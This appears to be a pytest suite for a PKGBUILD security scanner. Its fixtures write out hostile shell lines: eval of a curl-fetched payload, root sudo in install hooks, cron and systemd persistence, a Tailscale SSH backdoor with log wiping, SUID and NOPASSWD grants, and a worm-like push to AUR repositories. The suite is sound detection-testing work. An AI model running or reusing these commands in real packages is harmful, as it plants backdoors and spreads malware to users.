from aurascan.analyzers.deterministic import DeterministicAnalyzer
from aurascan.core.models import Phase, Severity


AUR_HOST = "aur.archlinux." + "org"


def analyze_text(text: str, phase=Phase.pkgbuild_static):
    return DeterministicAnalyzer().analyze_content("PKGBUILD", text, phase)


def rule_ids(findings):
    return {finding.rule_id for finding in findings}


def finding(findings, rule_id):
    return next(item for item in findings if item.rule_id == rule_id)


def test_eval_chain_detects_dynamic_eval_pattern():
    findings = analyze_text('build() {\n  eval "$generated_command"\n}\n')

    assert "EXEC-EVAL-001" in rule_ids(findings)
    eval_finding = finding(findings, "EXEC-EVAL-001")
    assert eval_finding.severity == Severity.HIGH
    assert eval_finding.requires_manual_review is True
    assert eval_finding.blocks_installation is False


def test_eval_comment_does_not_trigger():
    findings = analyze_text("# eval \"$(curl https://example.invalid/payload.sh)\"\n")

    assert "EXEC-EVAL-001" not in rule_ids(findings)
    assert "EXEC-EVAL-NET-001" not in rule_ids(findings)


def test_eval_network_decode_combo_is_blocking():
    findings = analyze_text("build() {\n  eval \"$(curl https://example.invalid/payload.sh)\"\n}\n")

    assert "EXEC-EVAL-NET-001" in rule_ids(findings)
    combo = finding(findings, "EXEC-EVAL-NET-001")
    assert combo.severity == Severity.CRITICAL
    assert combo.blocks_installation is True


def test_systemd_service_file_install_is_lower_severity_than_auto_enable():
    findings = analyze_text('package() {\n  install -Dm644 demo.service "$pkgdir/usr/lib/systemd/system/demo.service"\n}\n')

    assert "SYS-SYSTEMD-UNIT-001" in rule_ids(findings)
    unit = finding(findings, "SYS-SYSTEMD-UNIT-001")
    assert unit.severity == Severity.MEDIUM
    assert unit.blocks_installation is False


def test_systemd_enable_in_install_hook_requires_review():
    findings = analyze_text("post_install() {\n  systemctl enable demo.service\n}\n", Phase.install_hook_static)

    assert "SYS-SYSTEMD-AUTO-001" in rule_ids(findings)
    auto = finding(findings, "SYS-SYSTEMD-AUTO-001")
    assert auto.severity == Severity.HIGH
    assert auto.requires_manual_review is True


def test_systemd_user_service_persistence_detected():
    findings = analyze_text('package() {\n  install -Dm644 demo.service "$HOME/.config/systemd/user/demo.service"\n}\n')

    assert "SYS-SYSTEMD-USER-001" in rule_ids(findings)


def test_cron_file_install_detected():
    findings = analyze_text('package() {\n  install -Dm644 fixture.cron "$pkgdir/etc/cron.d/fixture"\n}\n')

    assert "SYS-CRON-FILE-001" in rule_ids(findings)


def test_crontab_command_detected():
    findings = analyze_text("post_install() {\n  crontab - <<'EOF'\n}\n", Phase.install_hook_static)

    assert "SYS-CRONTAB-001" in rule_ids(findings)


def test_cron_reboot_entry_detected():
    findings = analyze_text("post_install() {\n  printf '@reboot echo fixture\\n' > /tmp/fixture-cron\n}\n", Phase.install_hook_static)

    assert "SYS-CRON-REBOOT-001" in rule_ids(findings)


def test_trailing_comment_is_not_scanned():
    findings = analyze_text("pkgdesc='demo' # systemctl enable demo.service\n")

    assert "SYS-SYSTEMD-AUTO-001" not in rule_ids(findings)


def test_install_hook_sudo_execution_is_blocked():
    findings = analyze_text(
        "post_install() {\n  /usr/bin/sudo /usr/bin/fixture-helper\n}\n",
        Phase.install_hook_static,
    )

    privileged = finding(findings, "EXEC-INSTALL-HOOK-SUDO-001")
    assert privileged.severity == Severity.CRITICAL
    assert privileged.blocks_installation is True


def test_install_hook_sudo_in_comment_or_message_is_not_blocked():
    findings = analyze_text(
        "post_install() {\n"
        "  # /usr/bin/sudo /usr/bin/fixture-helper\n"
        "  echo 'Run /usr/bin/sudo /usr/bin/fixture-helper manually'\n"
        "  printf '; sudo /usr/bin/fixture-helper is an example\\n'\n"
        "}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_words_after_echo_are_not_command_positions():
    findings = analyze_text(
        "post_install() {\n"
        "  echo then sudo /usr/bin/fixture-helper\n"
        "}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_sudo_in_control_flow_is_blocked_and_evidence_is_redacted():
    findings = analyze_text(
        "post_install() {\n"
        "  if sudo /usr/bin/fixture-helper --auth-key=fixture-secret; then :; fi\n"
        "}\n",
        Phase.install_hook_static,
    )

    privileged = finding(findings, "EXEC-INSTALL-HOOK-SUDO-001")
    assert "fixture-secret" not in privileged.evidence_snippet
    assert privileged.evidence_snippet == "privileged sudo invocation in install hook"


def test_install_hook_sudo_user_privilege_drop_is_not_hard_blocked():
    findings = analyze_text(
        "post_install() {\n  sudo -H --user=fixture-user /usr/bin/fixture-helper\n}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_sudo_as_root_or_with_group_only_is_blocked():
    root_findings = analyze_text(
        "post_install() {\n  sudo -u root /usr/bin/fixture-helper\n}\n",
        Phase.install_hook_static,
    )
    group_findings = analyze_text(
        "post_install() {\n  sudo -g fixture-group /usr/bin/fixture-helper\n}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(root_findings)
    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(group_findings)


def test_install_hook_checks_each_sudo_command_on_a_line():
    findings = analyze_text(
        "post_install() {\n"
        "  sudo -u nobody true; sudo /usr/bin/fixture-helper\n"
        "}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(findings)


def test_install_hook_sudo_in_quoted_command_substitution_is_blocked():
    findings = analyze_text(
        'post_install() {\n  result="$(sudo /usr/bin/fixture-helper)"\n}\n',
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(findings)


def test_install_hook_command_substitution_ignores_parenthesis_in_quotes():
    findings = analyze_text(
        'post_install() {\n  result="$(printf \')\'; sudo /usr/bin/fixture-helper)"\n}\n',
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(findings)


def test_install_hook_escaped_substitutions_in_double_quotes_are_not_commands():
    findings = analyze_text(
        'post_install() {\n'
        '  first="\\$(sudo /usr/bin/fixture-helper)"\n'
        '  second="\\`sudo /usr/bin/fixture-helper\\`"\n'
        '}\n',
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_inert_argument_boundaries_are_not_commands():
    findings = analyze_text(
        "post_install() {\n"
        "  commands=(sudo /usr/bin/fixture-helper)\n"
        "  echo $(date) sudo /usr/bin/fixture-helper\n"
        '  echo "$(date)" sudo /usr/bin/fixture-helper\n'
        "  echo ${value} sudo /usr/bin/fixture-helper\n"
        "  echo wow! sudo /usr/bin/fixture-helper\n"
        "}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_assignment_and_backtick_command_contexts_are_blocked():
    assignment = analyze_text(
        "post_install() {\n  value=$(date) sudo /usr/bin/fixture-helper\n}\n",
        Phase.install_hook_static,
    )
    substitution = analyze_text(
        'post_install() {\n  value="`sudo /usr/bin/fixture-helper`"\n}\n',
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(assignment)
    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(substitution)


def test_non_comment_hash_syntax_does_not_hide_later_sudo_command():
    cases = (
        "value=${name#prefix}; sudo /usr/bin/fixture-helper\n",
        ": ${name##*/}; sudo /usr/bin/fixture-helper\n",
        "echo foo#bar; sudo /usr/bin/fixture-helper\n",
    )

    for content in cases:
        findings = analyze_text(content, Phase.install_hook_static)
        assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(findings)


def test_correlated_tailscale_root_ssh_backdoor_is_blocked_without_exposing_key():
    findings = analyze_text(
        "tailscale up --auth-key=fixture-only --ssh\n"
        "/usr/sbin/sshd -D -f /etc/pacman.d/fixture-sshd\n"
        "journalctl --vacuum-time=1s\n"
    )

    backdoor = finding(findings, "REMOTE-ADMIN-BACKDOOR-001")
    assert backdoor.severity == Severity.CRITICAL
    assert backdoor.blocks_installation is True
    assert "fixture-only" not in backdoor.evidence_snippet
    assert "Tailscale auth-key enrollment" in backdoor.evidence_snippet


def test_reported_hyprland_fixes_source_repository_is_blocked():
    source_url = "https://github." + "com/iusearch-hyprlandbtw/hyprland-fixes.git"
    findings = analyze_text(f"source=('git+{source_url}' 'https://example.invalid/?token=fixture-secret')\n")

    reported = finding(findings, "SUPPLYCHAIN-AUR-HYPRLAND-FIXES-20260828")
    assert reported.severity == Severity.CRITICAL
    assert reported.blocks_installation is True
    assert "fixture-secret" not in reported.evidence_snippet


def test_reported_source_repository_is_found_in_multiline_source_array():
    source_url = "https://github." + "com/iusearch-hyprlandbtw/hyprland-fixes.git"
    findings = analyze_text("source=(\n  'git+" + source_url + "'\n)\n")

    assert "SUPPLYCHAIN-AUR-HYPRLAND-FIXES-20260828" in rule_ids(findings)


def test_reported_hyprland_fixes_source_in_comment_does_not_trigger():
    source_url = "https://github." + "com/iusearch-hyprlandbtw/hyprland-fixes.git"
    findings = analyze_text(f"# source=('git+{source_url}')\n")

    assert "SUPPLYCHAIN-AUR-HYPRLAND-FIXES-20260828" not in rule_ids(findings)


def test_inert_reported_repository_references_do_not_claim_declared_source():
    source_url = "https://github." + "com/iusearch-hyprlandbtw/hyprland-fixes"
    findings = analyze_text(
        f"pkgdesc='Detector for {source_url}'\n"
        f"incident_reference='{source_url}'\n"
        f"source_reference=('{source_url}')\n"
        f"echo 'Do not install {source_url}'\n"
    )

    assert "SUPPLYCHAIN-AUR-HYPRLAND-FIXES-20260828" not in rule_ids(findings)


def test_aur_repository_propagation_endpoint_forms_are_blocked_in_package_code():
    endpoints = (
        f"ssh://aur@{AUR_HOST}/fixture-package.git",
        f"ssh://aur@{AUR_HOST}:2222/fixture-package.git",
        f"aur@{AUR_HOST}:fixture-package.git",
        f"https://{AUR_HOST}/fixture-package.git",
    )

    for endpoint in endpoints:
        findings = analyze_text(
            "prepare() {\n"
            f"  git remote add fixture '{endpoint}'\n"
            "  git add PKGBUILD .SRCINFO\n"
            "  git commit -m fixture-update\n"
            "  git push fixture main\n"
            "}\n"
        )

        propagation = finding(findings, "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001")
        assert propagation.severity == Severity.CRITICAL
        assert propagation.blocks_installation is True
        assert propagation.requires_manual_review is False
        assert propagation.line_number == 2
        assert propagation.evidence_snippet == (
            "Correlated signals: AUR Git remote; repository content mutation; Git push"
        )
        assert "fixture-package" not in propagation.evidence_snippet


def test_aur_repository_propagation_supports_constant_remote_and_git_options():
    findings = analyze_text(
        f"aur_remote='ssh://aur@{AUR_HOST}/fixture-secret.git'\n"
        "post_install() {\n"
        "  env LC_ALL=C git -C \"$repo\" remote set-url origin \"$aur_remote\"\n"
        "  command git -C \"$repo\" add PKGBUILD\n"
        "  /usr/bin/git -c user.name=fixture -C \"$repo\" commit -m update\n"
        "  /usr/bin/git --work-tree=\"$repo\" push origin main\n"
        "}\n",
        Phase.install_hook_static,
    )

    propagation = finding(findings, "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001")
    assert propagation.phase == Phase.install_hook_static
    assert propagation.line_number == 3
    assert "fixture-secret" not in propagation.evidence_snippet
    assert AUR_HOST not in propagation.evidence_snippet


def test_aur_repository_propagation_requires_all_three_behavior_families():
    aur_remote = f"git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
    mutation = "git add PKGBUILD\ngit commit -m fixture\n"
    push = "git push fixture main\n"

    incomplete_cases = (
        aur_remote,
        mutation,
        push,
        aur_remote + mutation,
        aur_remote + push,
        mutation + push,
        "git remote add fixture https://example.invalid/fixture.git\n" + mutation + push,
    )
    for content in incomplete_cases:
        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(analyze_text(content))


def test_aur_remote_metadata_or_unused_constant_does_not_anchor_git_push():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    findings = analyze_text(
        f"source=('https://{AUR_HOST}/fixture.git')\n"
        f"unused_remote='{endpoint}'\n"
        "git add PKGBUILD\n"
        "git commit -m fixture\n"
        "git push origin main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_plain_http_aur_url_does_not_anchor_repository_propagation():
    findings = analyze_text(
        f"git remote add fixture http://{AUR_HOST}/fixture.git\n"
        "git add PKGBUILD\n"
        "git commit -m fixture\n"
        "git push fixture main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_malformed_aur_remote_users_do_not_anchor_repository_propagation():
    malformed_endpoints = (
        f"ssh://{AUR_HOST}/fixture.git",
        f"ssh://git@{AUR_HOST}/fixture.git",
        f"https://aur@{AUR_HOST}/fixture.git",
        f"https://git@{AUR_HOST}/fixture.git",
    )
    for endpoint in malformed_endpoints:
        findings = analyze_text(
            f"git remote add fixture {endpoint}\n"
            "git add PKGBUILD\n"
            "git commit -m fixture\n"
            "git push fixture main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_reassigned_aur_remote_variable_is_ambiguous_and_does_not_anchor():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    for replacement in (
        "'https://example.invalid/fixture.git'",
        '"$fixture_remote"',
        endpoint,
    ):
        findings = analyze_text(
            f"remote='{endpoint}'\n"
            f"remote={replacement}\n"
            "git remote set-url origin \"$remote\"\n"
            "git add PKGBUILD\n"
            "git commit -m fixture\n"
            "git push origin main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_aur_repository_propagation_ignores_comments_messages_and_arrays():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    findings = analyze_text(
        f"# git remote add fixture {endpoint}\n"
        "echo 'git add PKGBUILD'\n"
        "printf 'git commit -m fixture\\n'\n"
        "commands=(git push fixture main)\n"
        f"echo git remote add fixture {endpoint}\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_aur_repository_propagation_ignores_dry_run_pushes():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    for dry_run in ("--dry-run", "--dry-run=true", "-n"):
        findings = analyze_text(
            f"git remote add fixture {endpoint}\n"
            "git add PKGBUILD\n"
            "git commit -m fixture\n"
            f"git push {dry_run} fixture main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_aur_repository_propagation_does_not_treat_disabled_dry_run_as_inert():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    findings = analyze_text(
        f"git remote add fixture {endpoint}\n"
        "git add PKGBUILD\n"
        "git commit -m fixture\n"
        "git push --dry-run=false fixture main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_aur_repository_propagation_requires_a_real_mutation_command():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    for mutation in ("git add --dry-run PKGBUILD", "git commit -n --dry-run", "git apply --check change.patch"):
        findings = analyze_text(
            f"git remote add fixture {endpoint}\n"
            f"{mutation}\n"
            "git push fixture main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_aur_repository_propagation_ignores_inert_heredoc_documentation():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    findings = analyze_text(
        "cat <<'DOC'\n"
        f"git remote add fixture {endpoint}\n"
        "git add PKGBUILD\n"
        "git commit -m fixture\n"
        "git push fixture main\n"
        "DOC\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_quoted_heredoc_marker_does_not_hide_active_propagation_commands():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    findings = analyze_text(
        "echo \"<<'DOC'\"\n"
        f"git remote add fixture {endpoint}\n"
        "git add PKGBUILD\n"
        "git commit -m fixture\n"
        "git push fixture main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_aur_repository_propagation_binds_push_to_the_aur_destination():
    findings = analyze_text(
        f"git fetch ssh://aur@{AUR_HOST}/fixture.git\n"
        "git add PKGBUILD\n"
        "git commit -m fixture\n"
        "git push https://git.example.invalid/fixture.git main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_aur_repository_propagation_requires_matching_remote_and_repository_context():
    findings = analyze_text(
        f"git -C one remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
        "git -C two add PKGBUILD\n"
        "git -C two push fixture main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_explicit_aur_push_endpoint_is_destination_bound():
    findings = analyze_text(
        "git add PKGBUILD\n"
        f"git push ssh://aur@{AUR_HOST}/fixture.git main\n"
    )

    propagation = finding(findings, "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001")
    assert propagation.line_number == 1
    assert AUR_HOST not in propagation.evidence_snippet


def test_aur_clone_binds_its_origin_to_the_clone_destination():
    clone_forms = (
        (
            f"git clone ssh://aur@{AUR_HOST}/fixture.git fixture-work\n",
            "origin",
            "fixture-work",
        ),
        (
            f"git clone ssh://aur@{AUR_HOST}/fixture.git\n",
            "origin",
            "fixture",
        ),
        (
            f"git clone --origin fixture-aur ssh://aur@{AUR_HOST}/fixture.git fixture-work\n",
            "fixture-aur",
            "fixture-work",
        ),
    )
    for clone, remote, destination in clone_forms:
        findings = analyze_text(
            clone
            + f"git -C {destination} add PKGBUILD\n"
            + f"git -C {destination} push {remote} main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_aur_clone_without_mutation_and_bound_push_remains_negative():
    findings = analyze_text(f"git clone ssh://aur@{AUR_HOST}/fixture.git fixture-work\n")

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_constant_aur_clone_endpoint_binds_default_origin():
    findings = analyze_text(
        f"aur_remote='ssh://aur@{AUR_HOST}/fixture.git'\n"
        'git clone "$aur_remote" fixture-work\n'
        "git -C fixture-work update-index --add PKGBUILD\n"
        "git -C fixture-work push origin main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_non_aur_remote_reassignment_removes_aur_push_binding():
    findings = analyze_text(
        f"git remote add origin ssh://aur@{AUR_HOST}/fixture.git\n"
        "git remote set-url origin https://git.example.invalid/fixture.git\n"
        "git add PKGBUILD\n"
        "git push origin main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_strict_aur_endpoint_tokens_reject_prefix_suffix_and_invalid_port():
    malformed_endpoints = (
        f"xssh://aur@{AUR_HOST}/fixture.git",
        f"notaur@{AUR_HOST}:fixture.git",
        f"ssh://aur@{AUR_HOST}/fixture.git.backup",
        f"https://{AUR_HOST}/fixture.git.txt",
        f"ssh://aur@{AUR_HOST}:65536/fixture.git",
    )
    for endpoint in malformed_endpoints:
        findings = analyze_text(
            f"git remote add fixture {endpoint}\n"
            "git add PKGBUILD\n"
            "git push fixture main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_multiline_quoted_documentation_and_arrays_are_inert():
    inert_cases = (
        (
            "docs='\n"
            f"git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
            "git add PKGBUILD\n"
            "git push fixture main\n"
            "'\n"
        ),
        (
            'docs="\n'
            f"git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
            "git add PKGBUILD\n"
            "git push fixture main\n"
            '"\n'
        ),
        (
            "commands=(\n"
            f"git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
            "git add PKGBUILD\n"
            "git push fixture main\n"
            ")\n"
        ),
    )
    for content in inert_cases:
        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(analyze_text(content))


def test_backslash_continued_git_commands_preserve_physical_line_mapping():
    findings = analyze_text(
        "git \\\n"
        "  remote add fixture \\\n"
        f"  ssh://aur@{AUR_HOST}/fixture.git\n"
        "git add PKGBUILD\n"
        "git push fixture main\n"
    )

    propagation = finding(findings, "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001")
    assert propagation.line_number == 1


def test_git_command_prefix_options_do_not_hide_destination_bound_chain():
    prefixes = ("env -i ", "/usr/bin/env ", "command -- ", "time -p ", "exec -- ")
    for prefix in prefixes:
        findings = analyze_text(
            f"{prefix}git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
            f"{prefix}git add PKGBUILD\n"
            f"{prefix}git push fixture main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_quoted_arbitrary_heredoc_delimiters_remain_inert():
    for opener, closer in (("<<'END-DOC'", "END-DOC"), ('<<"END.DOC"', "END.DOC")):
        findings = analyze_text(
            f"cat {opener}\n"
            f"git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
            "git add PKGBUILD\n"
            "git push fixture main\n"
            f"{closer}\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_unquoted_heredoc_command_substitutions_are_active():
    substitutions = (
        f"$(git remote add fixture ssh://aur@{AUR_HOST}/fixture.git; "
        "git add PKGBUILD; git push fixture main)",
        f"`git remote add fixture ssh://aur@{AUR_HOST}/fixture.git; "
        "git add PKGBUILD; git push fixture main`",
    )
    for substitution in substitutions:
        findings = analyze_text(f"cat <<EOF\n{substitution}\nEOF\n")

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)

    multiline = analyze_text(
        "cat <<EOF\n"
        "$(\n"
        f"git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
        "git add PKGBUILD\n"
        "git push fixture main\n"
        ")\n"
        "EOF\n"
    )
    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(multiline)


def test_arithmetic_and_double_bracket_shifts_do_not_start_heredocs():
    expressions = (
        "$((1 << shift))",
        "$[1 << shift]",
        "((value << 1))",
        "[[ value << marker ]]",
    )
    for expression in expressions:
        findings = analyze_text(
            expression
            + "\n"
            + f"git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
            + "git add PKGBUILD\n"
            + "git push fixture main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_array_command_substitution_is_active_even_when_other_elements_are_inert():
    findings = analyze_text(
        "commands=(\n"
        "  harmless\n"
        f"  \"$(git remote add fixture ssh://aur@{AUR_HOST}/fixture.git; "
        "git add PKGBUILD; git push fixture main)\"\n"
        ")\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_aur_endpoint_variable_lookup_is_bounded_and_exact():
    assignments = "".join(
        f"remote_{index}='ssh://aur@{AUR_HOST}/fixture-{index}.git'\n"
        for index in range(512)
    )
    findings = analyze_text(
        assignments
        + 'git remote add fixture "$remote_511"\n'
        + "git add PKGBUILD\n"
        + "git push fixture main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_optional_propagation_evidence_is_fixed_and_only_added_after_the_triad():
    content = (
        "find /tmp -type d -name .git\n"
        "for fixture_repo in /tmp/fixture-*; do\n"
        '  ssh-add "$HOME/.ssh/id_ed25519"\n'
        f"  git -C \"$fixture_repo\" remote set-url origin ssh://aur@{AUR_HOST}/fixture.git\n"
        '  git -C "$fixture_repo" add PKGBUILD\n'
        '  git -C "$fixture_repo" push origin main\n'
        "done\n"
    )
    findings = DeterministicAnalyzer().analyze_content(
        ".fixture.install",
        content,
        Phase.install_hook_static,
    )

    propagation = finding(findings, "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001")
    assert propagation.evidence_snippet == (
        "Correlated signals: AUR Git remote; repository content mutation; Git push; "
        "repository enumeration; repository iteration loop; SSH agent or key reference; "
        "dot-prefixed install hook"
    )
    assert AUR_HOST not in propagation.evidence_snippet
    assert "fixture_repo" not in propagation.evidence_snippet

    incomplete = DeterministicAnalyzer().analyze_content(
        ".fixture.install",
        "find /tmp -type d -name .git\nssh-add fixture-key\n",
        Phase.install_hook_static,
    )
    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(incomplete)


def test_tailscale_service_or_status_alone_is_not_a_backdoor_match():
    findings = analyze_text(
        "systemctl enable tailscaled\n"
        "tailscale status\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_disabled_tailscale_ssh_flag_is_not_a_remote_anchor():
    findings = analyze_text(
        "tailscale up --auth-key=fixture-only --ssh=false\n"
        "journalctl --vacuum-time=1s\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_quoted_remote_access_examples_are_not_treated_as_commands():
    findings = analyze_text(
        "echo 'tailscale up --auth-key=fixture-only --ssh'\n"
        "printf 'journalctl --vacuum-time=1s\\n'\n"
        "echo if tailscale up --auth-key=fixture-only --ssh\n"
        "echo then journalctl --vacuum-time=1s\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_quoted_ssh_config_or_disguised_name_without_path_is_not_remote_anchor():
    config_findings = analyze_text(
        'echo "Port 3333 PermitRootLogin yes"\n'
        "chmod 4755 /tmp/fixture-helper\n"
    )
    name_findings = analyze_text(
        'pkgdesc="mirrorlist-criteria"\n'
        "chmod 4755 /tmp/fixture-helper\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(config_findings)
    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(name_findings)


def test_alternate_root_ssh_config_near_pacman_path_is_remote_anchor():
    findings = analyze_text(
        "cat > /etc/pacman.d/fixture-sshd <<'EOF'\n"
        "Port 3333\n"
        "PermitRootLogin yes\n"
        "EOF\n"
        "chmod 4755 /tmp/fixture-helper\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" in rule_ids(findings)


def test_remote_access_pair_scan_handles_adversarial_escaped_newlines():
    findings = analyze_text(
        "Port 3333 " + (r"\n" * 80) + " no-root-login\n"
        "OnCalendar=hourly " + (r"\n" * 80) + " no-root-user\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_shell_quote_mask_handles_many_unclosed_command_substitutions():
    findings = analyze_text('echo "' + ("$(" * 10_000) + '\n')

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_suid_and_sudoers_without_remote_anchor_are_not_called_a_backdoor():
    findings = analyze_text(
        'chmod 4755 "$target"\n'
        '%wheel ALL=(ALL) NOPASSWD: /usr/bin/fixture-helper\n'
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_numeric_suid_in_comment_does_not_block():
    findings = analyze_text("# chmod 4755 /usr/bin/fixture-helper\n")

    assert "SYS-CHMOD-001" not in rule_ids(findings)


def test_numeric_suid_in_quoted_documentation_does_not_block():
    findings = analyze_text('echo "chmod 4755 is unsafe"\n')

    assert "SYS-CHMOD-001" not in rule_ids(findings)


def test_sudoers_dropin_requires_review_and_nopasswd_blocks():
    dropin = analyze_text('install -Dm440 fixture "$pkgdir/etc/sudoers.d/fixture"\n')
    grant = analyze_text('%wheel ALL=(ALL) NOPASSWD: /usr/bin/fixture-helper\n')

    assert finding(dropin, "PRIV-SUDOERS-DROPIN-001").requires_manual_review is True
    assert finding(grant, "PRIV-SUDOERS-NOPASSWD-001").blocks_installation is True


def test_nopasswd_word_in_package_description_is_not_sudo_policy():
    findings = analyze_text('pkgdesc="Supports review of NOPASSWD: sudo policy"\n')

    assert "PRIV-SUDOERS-NOPASSWD-001" not in rule_ids(findings)


def test_numeric_suid_mode_is_blocked():
    findings = analyze_text('chmod 4755 "$target"\n')

    assert finding(findings, "SYS-CHMOD-001").blocks_installation is True
